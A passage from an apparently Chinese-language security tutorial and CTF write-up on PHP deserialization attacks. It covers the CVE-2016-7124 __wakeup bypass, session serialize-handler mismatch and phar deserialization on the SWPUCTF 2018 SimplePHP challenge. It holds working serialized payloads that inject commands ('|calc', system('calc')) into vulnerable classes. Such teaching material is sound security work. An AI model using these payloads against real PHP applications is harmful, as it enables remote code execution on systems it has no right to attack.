keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以简单的分析一下代码</p><p>定义了一个<code>class</code>类，类中有两个私有变量<code>method</code>和<code>args</code></p><p>有三个魔术方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>  <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析代码段中<code>host</code>的来源，想办法利用<code>system()</code>构成RCE</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们观察代码可知：</p><p><code>GET</code>方法获取参数a，并且将其反序列化。</p><p>但是再执行反序列化的时候，会自动调用<code>__wakeup()</code>魔术方法，把<code>args</code>的值改为<code>127.0.0.1</code></p><p>无论我们怎么构造payload，<code>system()</code>执行的命令都是<code>ping -c 2 127.0.0.1</code></p><p>这时我们可以利用到<code>CVE-2016-7124</code>漏洞</p><blockquote><p>适用版本：</p><p>PHP5&lt;5.6.25、PHP7&lt;7.0.1</p><p>当成员属性数目大于实际数码时可绕过__wakeup方法</p></blockquote><p>就可以构造恶意payload来RCE</p><p>这里还有个小知识点<code>|</code>管道符</p><pre class="line-numbers language-none"><code class="language-none">把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/xMTGeRKUBzPyNmA.png"></p><p>所以我们可以构造序列化了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"|calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">O:4:"home":2:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要跳一下<code>__wakeup()</code>把成员属性数目改为3</p><pre class="line-numbers language-none"><code class="language-none">O:4:"home":3:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL编码一下</p><pre class="line-numbers language-none"><code class="language-none">O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/olTV4wmYSr956LB.png"></p><p>成功RCE</p><h4 id="（2）session反序列化漏洞"><a href="#（2）session反序列化漏洞" class="headerlink" title="（2）session反序列化漏洞"></a>（2）session反序列化漏洞</h4><p>当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以<code>php_serialize</code>序列化存储session，以PHP反序列化读取session，造成反序列化攻击</p><p>例子：</p><p>phpinfo：</p><p><img src="https://i.loli.net/2021/08/24/C14l6r5eLQp2AmS.png"></p><p>s1.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.serialize_handler"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>s2.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">function</span>  <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要说一下<code>unserialize</code>的特性，在执行<code>unserialize</code>的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略</p><pre class="line-numbers language-none"><code class="language-none">a:1:{s:2:"h3";s:52:"|O:7:"session":1:{s:3:"var";s:15:"system('calc');";}";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('calc');"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><p><img src="https://i.loli.net/2021/08/24/UrW1hiGNb3tDOCF.png"></p><p>上文可以给<code>$_SESSION</code>赋值，若代码中不存在给<code>$_SESSION</code>赋值可以利用<code>uplode_process</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可以控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.prefix"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）phar反序列化"><a href="#（3）phar反序列化" class="headerlink" title="（3）phar反序列化"></a>（3）phar反序列化</h4><p>利用条件：</p><pre class="line-numbers language-none"><code class="language-none">-phar文件能够上传到服务器-要有可用的魔术方法作为“跳板”-文件操作函数的参数可控，且：/ \ 等特殊字符没有被过滤有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/M5PC2WlcJatqrNS.png"></p><h5 id="例题"><a href="#例题" class="headerlink" title="例题:"></a>例题:</h5><p>[SWPUCTF 2018]SimplePHP</p><p><img src="https://i.loli.net/2021/08/24/rhZvp5VsES6DOzB.png"></p><p>存在任意文件读取</p><p>先来读取一下<code>upload_file.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span> <span class="token single-quoted-string string">'function.php'</span><span class="token punctuation">;</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再来读取一下<code>function.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token double-quoted-string string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpeg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再读取一下<code>base.php</code></p><p>发现了提示</p><p><img src="https://i.loli.net/2021/08/24/4cLySiwZdTp29NI.png"></p><p>回头再来看<code>class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token 